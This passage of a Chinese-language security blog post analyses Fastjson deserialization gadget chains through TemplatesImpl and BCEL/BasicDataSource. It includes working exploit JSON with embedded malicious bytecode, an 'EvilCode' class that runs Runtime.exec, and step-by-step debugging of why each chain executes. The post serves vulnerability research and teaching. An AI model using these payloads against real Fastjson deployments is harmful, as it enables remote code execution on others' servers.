+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Test</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// TemplateImplChain.java</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplateImplChain</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\": "</span> <span class="token operator">+</span>
+                <span class="token string">"[\"yv66vgAAADQANwoACAAnCgAoACkIACoKACgAKwcALAoABQAnBwAtBwAuAQAGPGluaXQ"</span> <span class="token operator">+</span>
+                <span class="token string">"+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABtMRmFzdGpzb25SZXNlYXJjaC9FdmlsQ29kZTsBAApFeGNlcHRpb25zBwAvAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAwAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQBABdMRmFzdGpzb25SZXNlYXJjaC9UZXN0OwcAMQEAClNvdXJjZUZpbGUBAA1FdmlsQ29kZS5qYXZhDAAJAAoHADIMADMANAEAPS9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3IMADUANgEAFUZhc3Rqc29uUmVzZWFyY2gvVGVzdAEAGUZhc3Rqc29uUmVzZWFyY2gvRXZpbENvZGUBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABwAIAAAAAAAEAAEACQAKAAIACwAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAMAAAADgADAAAADAAEAA0ADQAOAA0AAAAMAAEAAAAOAA4ADwAAABAAAAAEAAEAEQABABIAEwABAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAEgANAAAAKgAEAAAAAQAOAA8AAAAAAAEAFAAVAAEAAAABABYAFwACAAAAAQAYABkAAwABABIAGgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFwANAAAAIAADAAAAAQAOAA8AAAAAAAEAFAAVAAEAAAABABsAHAACABAAAAAEAAEAHQAJAB4AHwACAAsAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAwAAAAKAAIAAAAaAAgAGwANAAAAFgACAAAACQAgACEAAAAIAAEAIgAjAAEAEAAAAAQAAQAkAAEAJQAAAAIAJg==\"],\"_name\": \"x\",\"_tfactory\": &#123;&#125;,\"_outputProperties\": &#123;&#125;,&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20230731213023505.png" alt="image-20230731213023505"></p>
+<p><img src="/images/image-20230731213028021.png" alt="image-20230731213028021"></p>
+<p><img src="/images/image-20230731213032216.png" alt="image-20230731213032216"></p>
+<p><img src="/images/image-20230731213043887.png" alt="image-20230731213043887"></p>
+<p><img src="/images/image-20230731213048446.png" alt="image-20230731213048446"></p>
+<p><img src="/images/image-20230731213052715.png" alt="image-20230731213052715"></p>
+<p><img src="/images/image-20230731213057315.png" alt="image-20230731213057315"></p>
+<p>这里判断了字符串的第一个字符的token为左大括号，则实例化了一个JSON对象</p>
+<p><img src="/images/image-20230731213132416.png" alt="image-20230731213132416"></p>
+<p><img src="/images/image-20230731213137034.png" alt="image-20230731213137034"></p>
+<p><img src="/images/image-20230731213141831.png" alt="image-20230731213141831"></p>
+<p>这里 <code>isObjectKey</code> 为false且设置key变量值为@type，判断了当前JSON解析器解析字符串的字符，到这里其实就是到了上图这个位置了</p>
+<p><img src="/images/image-20230731213255640.png" alt="image-20230731213255640"></p>
+<p>这里就是对 <code>isObjectKey</code> 值取反判断，执行 <code>lexer.next()</code> 获取下一个词法单元（符号）也就是双引号字符（”），再后面就是调用 <code>lexer.scanSymbol()</code> 方法从解析器中读取字符，直到遇到第二个引号字符（”）为止，这样的话就获取到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个字符串，接着调用 <code>TypeUtils</code> 类的loadClass静态方法加载TemplatesImpl类，TypeUtils类的loadClass静态方法其实主要就是做了判断ParserConfig类中的默认加载器是不是为null，为null的话就使用AppClassLoader加载器进行加载并返回加载后的类</p>
+<p><img src="/images/image-20230731213337563.png" alt="image-20230731213337563"></p>
+<p><code>lexer.nextToken(JSONToken.COMMA)</code> 获取下一个标记，下一个标记是<code>JSONToken.COMMA</code> 常量，对应的字符是 <code>,</code> 逗号，下一个标记确实是 <code>,</code> 逗号，接着判断下一个词法单元（符号）是不是右大括号，很显然不是，则继续往下看</p>
+<p><img src="/images/image-20230731213420999.png" alt="image-20230731213420999"></p>
+<p>通过ParserConfig类config对象获取<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 的反序列器并调用反序列化器的序列化方法</p>
+<p><img src="/images/image-20230731213438503.png" alt="image-20230731213438503"></p>
+<p><img src="/images/image-20230731213443139.png" alt="image-20230731213443139"></p>
+<p><img src="/images/image-20230731213448062.png" alt="image-20230731213448062"></p>
+<p><img src="/images/image-20230731213451912.png" alt="image-20230731213451912"></p>
+<p>进入了反序列化方法后，前面都是一些赋值判断的操作，到了这里其实就是将 <code>sortedFieldDeserializers</code> 字段反序列化器数组进行一个遍历，第一次遍历获取的是 <code>outputProperties</code> 字段</p>
+<p><img src="/images/image-20230731213531151.png" alt="image-20230731213531151"></p>
+<p>这里就是判断了 <code>outputProperties</code> 字段是什么类型的，再跟下去</p>
+<p><img src="/images/image-20230731213544983.png" alt="image-20230731213544983"></p>
+<p>跟下去发现下面的所有判断都不符合，直接进入第二次循环，这次是 <code>stylesheetDOM</code> 字段下面的判断也是不符合的，进入第三次循环也是不符合判断要求，这里就不详细看了</p>
+<p><img src="/images/image-20230731213607949.png" alt="image-20230731213607949"></p>
+<p>再往下就是到了这里，由于上面三次都没有符合判断要求，所以matchField为false，这里开始判断key的值是否一致</p>
+<p><img src="/images/image-20230731213630191.png" alt="image-20230731213630191"></p>
+<p>上面判断也不符合要求，到了这里，将JSON解析器和&#96;&#96;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<code>类作为</code>createInstance&#96; 方法的参数创建实例，跟进看一下</p>
+<p><img src="/images/image-20230731213654951.png" alt="image-20230731213654951"></p>
+<p><img src="/images/image-20230731213700214.png" alt="image-20230731213700214"></p>
+<p><img src="/images/image-20230731213707360.png" alt="image-20230731213707360"></p>
+<p>这里就是获取了 <code>TemplatesImpl</code> 类的默认构造器，如果这个默认构造器参数数量为0的话，那就通过这个默认构造器进行实例化对象并返回</p>
+<p><img src="/images/image-20230731213746296.png" alt="image-20230731213746296"></p>
+<p><img src="/images/image-20230731213752741.png" alt="image-20230731213752741"></p>
+<p><img src="/images/image-20230731213758862.png" alt="image-20230731213758862"></p>
+<p><img src="/images/image-20230802112403694.png" alt="image-20230802112403694"></p>
+<p><img src="/images/image-20230802112408475.png" alt="image-20230802112408475"></p>
+<p><img src="/images/image-20230802112411540.png" alt="image-20230802112411540"></p>
+<p>接着解析器获取了下一个key，后面就是解析我们传入的JSON字符串字段 <code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code>、<code>_outputProperties</code> 的操作</p>
+<p><img src="/images/image-20230802112448333.png" alt="image-20230802112448333"></p>
+<p>只有当key为 <code>_outputProperties</code> 时，才能获取到字段反序列化器，前面的操作都是各种判断JSON解析器细节方面的东西，随后调用parseField方法，跟进看一下</p>
+<p><img src="/images/image-20230802112540172.png" alt="image-20230802112540172"></p>
+<p><img src="/images/image-20230802112545224.png" alt="image-20230802112545224"></p>
+<p>parseField方法主要是获取字段反序列化器，由于 <code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code> 这些私有字段在TemplatesImpl类中都没有对应的public修饰符的getter和setter方法，所以没有字段反序列化器，而 <code>_outputProperties</code> 私有字段有对应public修饰符的getter方法，那么它就拥有一个字段反序列化器</p>
+<p><img src="/images/image-20230802112637607.png" alt="image-20230802112637607"></p>
+<p><img src="/images/image-20230802112641246.png" alt="image-20230802112641246"></p>
+<p>这里有一个注意的地方，就是key为 <code>_bytecodes</code> 时和 <code>_outputProperties</code> 的区别</p>
+<p><img src="/images/image-20230802220248759.png" alt="image-20230802220248759"></p>
+<p><img src="/images/image-20230802220511062.png" alt="image-20230802220511062"></p>
+<p><img src="/images/image-20230802220637848.png" alt="image-20230802220637848"></p>
+<p><img src="/images/image-20230802220905757.png" alt="image-20230802220905757"></p>
+<p><img src="/images/image-20230802221042449.png" alt="image-20230802221042449"></p>
+<p><img src="/images/image-20230802221256892.png" alt="image-20230802221256892"></p>
+<p><img src="/images/image-20230802221402556.png" alt="image-20230802221402556"></p>
+<p>这里对字段值反序列化器进行反序列化获取值，这里要注意的是在前面key为 <code>_bytecodes</code> 时，会调用到 <code>ObjectArrayCodec</code> 类中的 <code>deserialze</code> 方法，该类对JSON字符串数组进行了一个解析，将JSON字符串数组进行了Base64解码，所以在写Payload时需要将 <code>_bytecodes</code> 键的值进行Base64编码</p>
+<p>当key为 <code>_outputProperties</code> 时，会调用 <code>MapDeserializer</code> 类的 <code>deserialze</code> 方法，这个key是没有设置值的，所以这里返回null</p>
+<p><img src="/images/image-20230802112653237.png" alt="image-20230802112653237"></p>
+<p><img src="/images/image-20230802112657428.png" alt="image-20230802112657428"></p>
+<p>setValue方法判断了getOutputProperties方法字段访问权限和字段类</p>
+<p><img src="/images/image-20230802112707125.png" alt="image-20230802112707125"></p>
+<p>这里判断了 <code>getOutputProperties</code> 方法的返回值类型是否是Map类或Map子类，该方法返回值类型是 <code>Properties</code>，该类型是Map的子类，后面就是使用反射调用TemplatesImpl类的 <code>getOutputProperties</code> 方法</p>
+<p><img src="/images/image-20230802112731017.png" alt="image-20230802112731017"></p>
+<p>在 <code>getOutputProperties</code> 方法中调用了 <code>newTransformer</code> 方法，跟进看一下</p>
+<p><img src="/images/image-20230802112915054.png" alt="image-20230802112915054"></p>
+<p>这里调用了 <code>getTransletInstance</code> 方法，再跟进看一下</p>
+<p><img src="/images/image-20230802112925992.png" alt="image-20230802112925992"></p>
+<p><code>getTransletInstance</code> 方法中判断了json字符串的 <code>_name</code> 和 <code>_class</code> 是否为空，这样就是为什么在payload中json字符串中必须要设置_name变量的值，不设置值这里就直接返回null了，<code>_class</code> 变量我们没有设置，即调用 <code>defineTransletClasses</code> 方法</p>
+<p><img src="/images/image-20230802113012859.png" alt="image-20230802113012859"></p>
+<p>这里还需要注意到一点的是 <code>_tfactory</code> 在JSON字符串中必须存在键值对，可以是空值，但不能没有，否则没有办法实例化 <code>TransletClassLoader</code> 加载器</p>
+<p><img src="/images/image-20230802113016492.png" alt="image-20230802113016492"></p>
+<p><img src="/images/image-20230802113019459.png" alt="image-20230802113019459"></p>
+<p><code>_bytecodes</code> 也不能为null，否则就抛出异常了。接着就是获取<code>TransletClassLoader</code>，通过 <code>TransletClassLoader.defineClass()</code> 方法将json字符串中的 <code>_bytecodes</code> 变量恶意代码字节码值转换成一个类实例，然后判断了我们恶意代码类的父类全限定类名是否包含 <code>ABSTRACT_TRANSLET</code> 常量值 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，这就是为什么要在恶意类中需要继承 <code>AbstractTranslet</code> 类的原因，如果没有继承，则 <code>_transletIndex</code> 变量为-1，再走到下面 <code>_transletIndex</code> 小于0就会抛出异常了，所以必须要让恶意类继承 <code>AbstractTranslet</code> 类</p>
+<p><img src="/images/image-20230802124050218.png" alt="image-20230802124050218"></p>
+<p><img src="/images/image-20230802124349503.png" alt="image-20230802124349503"></p>
+<p><code>_class</code> 数组里下标为0的就是通过 <code>TransletClassLoader</code> 加载器加载的恶意类，调用 <code>newInstance</code> 方法即可实例化恶意类对象，即执行恶意类的代码，弹出计算器</p>
+<h2 id="BCEL利用链"><a href="#BCEL利用链" class="headerlink" title="BCEL利用链"></a>BCEL利用链</h2><p>BCEL链也是一种不出网的利用链，虽然 <code>TemplatesImpl</code> 利用链也是不出网的利用链，但是这个利用链很苛刻，需要开启 <code>Feature.SupportNonPublicField</code> 对非公开字段的支持。BECL利用链需要tomcat的依赖tomcat-dbcp，对于Tomcat8.0之前版本使用 <code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>，Tomcat8.0之后使用 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// BCELEvilCode.java</span>
+<span class="token keyword">package</span> <span class="token class-name">FastjsonResearch</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BCELEvilCode</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token class-name">BCELEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// BCELEncode.java</span>
+<span class="token keyword">package</span> <span class="token class-name">FastjsonResearch</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span><span class="token class-name">Utility</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BCELEncode</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"/Users/wiley/IdeaProjects/javaResearch/src/main/java/FastjsonResearch/BCELEvilCode.class"</span><span class="token punctuation">;</span>
+        <span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"File does not exist: "</span> <span class="token operator">+</span> filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecodes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token string">"$$BCEL$$"</span> <span class="token operator">+</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bytecodes<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// BCELChain.java</span>
+<span class="token keyword">package</span> <span class="token class-name">FastjsonResearch</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BCELChain</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> jsonstr <span class="token operator">=</span> <span class="token string">"&#123;\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": "</span> <span class="token operator">+</span>
+                <span class="token string">"&#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;,\"driverClassName\": "</span> <span class="token operator">+</span>
+                <span class="token string">"\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$C1$Q$7d$Fd$R$f9F$fc$f6$e0I$f0$40$_$deP$T$r$90$98$a0$Y0z$$$b5$c1$92$a5$bb$d9$ed$S$fcY$5e$d4x$f0$H$f8$a3$8c$b3$i$90$c46$9d$e9$9b7$af3$9d$ef$9f$cf$_$A$a78$c8$o$8db$W$r$943$a8$c4$be$ea$60$d3A$8d$n$7d$a6$8d$b6$X$M$c9z$e3$81$n$d5$f6$9e$UC$b1$a7$8d$ba$8d$a6$p$V$dc$8b$91K$91lg$$$95o$b5gB$H$5b$84$87$5e$UH$d5$d51Y$bejwz$9d$99vcus$of$o$H$H$Z$H$db9$ec$60$97$e1$9c$P_B$ab$a6$fc$d2$f7$5d$z$c5$e2$j$de$W$ae$8c$5ca$bd$a0$v$7c$9f$b7$3dc$95$b1$n$bf$R$b2$3f$5cas$d8$c3$3e$c3aW$84v$Szf$a0B$r$C$f9$ccW$cb2$94$e2$c2$dc$Vf$cc$fb$a3$89$92$96$a1$ba$Ii$8f_$f7$97$fdS$bb$7f$89$83$c8X$3d$8d$ff7Vv$Jj$f5F$ef_N$8b$a6$a3$e6J2$i$d7W$d8$a1$N$b4$Z$b7V$Fw$81$tU$Y$b6p$845$g$7c$bc$Ym$9a$I$SX$t$d4$q$cf$c8$XN$de$c1$3e$90$a8$q$df$90z$7c$5d$e4e$e38$92d$d3H$91$sO$aa$NB$v$e2rt$f2tO$a0$f0$L$e7$dd$60$ef$dc$B$A$A\n\"&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/wps14.jpg" alt="img"></p>
+<p>我们先来看下BCEL这条链的触发点在哪里，<code>org.apache.tomcat.dbcp.dbcp2</code> 包下的<code>DriverFactory</code> 类中，<code>createDriver</code> 静态方法使用</p>
+<p><code>BasicDataSource</code> 类型对象的 <code>driverClassLoader</code> 加载器加载了BasicDataSource类型对象的 <code>driverClassName</code></p>
+<p><img src="/images/wps15.jpg" alt="img"> </p>
+<p><img src="/images/wps16.jpg" alt="img"> </p>
+<p><code>driverClassLoader</code> 是我们在JSON字符串中写的是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 这个类，那么就会调用ClassLoader该类中的 <code>loadClass</code> 方法，在这个方法中判断了 <code>class_name</code> 是否是 <code>$$BCEL$$</code> 字符开头的，否则就会抛出异常了，接着后面调用了 <code>createClass</code> 方法，这个方法就是将 <code>class_name</code> 中的字节码转换成类</p>
+<p><img src="/images/wps17.jpg" alt="img"> </p>
+<p>在 <code>createClass</code> 方法中，将 <code>$$BCEL$$</code> 字符删除后进行解码，再对这个解码后的字节码进行解析，所以在JSON字符串中 <code>driverClassName</code> 键的值需要进行编码</p>
+<p><img src="/images/wps18.jpg" alt="img"> </p>
+<p>后面就是对解析后的类再进行一些处理，再将这个类进行返回</p>
+<p><img src="/images/wps19.jpg" alt="img"> </p>
+<p>再获取这个类的字节码，加载成一个具体的类</p>
+<p><img src="/images/wps20.jpg" alt="img"> </p>
+<p>使用自定义加载器 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 加载完成后得到的具体恶意类进行了实例化，这里是真正进行执行恶意代码的地方，我们再看下是这个调用链是什么样的</p>
+<p><img src="/images/wps21.jpg" alt="img"> </p>
+<p><img src="/images/wps22.jpg" alt="img"> </p>
+<p><img src="/images/wps23.jpg" alt="img"> </p>
+<p>这里就是一个完整的调用链</p>
+<p><code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;DriverFactory.createDriver()</code></p>
+<p><img src="/images/wps24.jpg" alt="img"> </p>
+<p>我们清楚这条链的触发点后，至于前面的 <code>parse</code> 方法解析JSON字符串，在Fastjson反序列化一开始我们就已经跟着程序调试分析了，就是去根据我们给的JSON字符串去解析成对应的对象，接着调用 <code>toJSON</code> 方法<img src="/images/wps25.jpg" alt="img"></p>
+<p><img src="/images/wps26.jpg" alt="img"> </p>
+<p><img src="/images/wps27.jpg" alt="img"> </p>
+<p>这里会将传入的类名 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code> 的序列化器转换成JavaBean序列化器，使用该JavaBean序列化器获取获取所有字段值</p>
+<p><img src="/images/wps28.jpg" alt="img"> </p>
+<p>这里就是对 <code>BasicDataSource</code> 类型对象的所有getter方法获取属性值，再看下 <code>getPropertyValue</code> 方法做了什么</p>
+<p><img src="/images/wps29.jpg" alt="img"> </p>
+<p>这里调用了 <code>fieldInfo</code> 的 <code>get</code> 方法</p>
+<p><img src="/images/wps30.jpg" alt="img"> </p>
+<p>这个get方法使用反射进行了方法的调用</p>
+<p><img src="/images/wps31.jpg" alt="img"> </p>
+<p>那么这里只需要 <code>getter</code> 的变量值是 <code>connection</code> ，就会调用 <code>getConnection</code> 方法，这样我们这条完整的链就通了</p>
+<p><img src="/images/wps32.jpg" alt="img"> </p>
+<p><img src="/images/wps33.jpg" alt="img"> </p>
+<p><img src="/images/wps34.jpg" alt="img"> </p>
+<p>但是我们发现不只是 <code>getConnection</code> 方法调用了 <code>createDataSource</code> 方法， <code>getLogWriter</code> 方法同样也调用了，而在解析对象时，在 <code>FieldSeriailzer</code> 对象数组类型的 <code>sortedGetters</code> 变量中，<code>connection</code> 相对于 <code>logwriter</code> 而言排在最前面，所以最先执行的也是这个方法，这就是为什么网上的文章都在说 <code>getConnection</code> 方法而没有说 <code>getLogWriter</code> 方法的原因</p>
+<p><img src="/images/wps35.jpg" alt="img"> </p>
+<p>最后依次往下执行，成功执行了恶意代码</p>
+
+    </div>
+    
+    <div class="post__license">
+        <p>
+            <strong>Author: </strong>wileysec
+        </p>
+        <p>
+            <strong>
+                Permalink: 
+            </strong>
+            <a href="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/11c62fd672b4.html">https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/11c62fd672b4.html</a>
+        </p>
+        
+    </div>
+ 
